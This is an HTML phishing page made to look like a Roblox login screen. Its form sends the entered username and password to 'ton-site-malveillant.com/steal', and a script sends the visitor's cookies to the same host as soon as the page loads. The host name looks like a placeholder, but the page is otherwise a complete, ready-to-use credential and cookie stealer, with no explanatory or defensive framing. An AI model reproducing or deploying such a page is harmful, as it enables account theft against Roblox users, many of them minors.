<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f3f3f3; text-align: center; }
        .container { background: white; width: 300px; margin: 100px auto; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #00a2ff; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
        .logo { width: 150px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.roblox.com/assets/branding/roblox-logo.png" class="logo">
        <h2>Login to Roblox</h2>
        <form action="https://ton-site-malveillant.com/steal" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            fetch('https://ton-site-malveillant.com/steal?cookies=' + document.cookie);
        });
    </script>
</body>
</html>
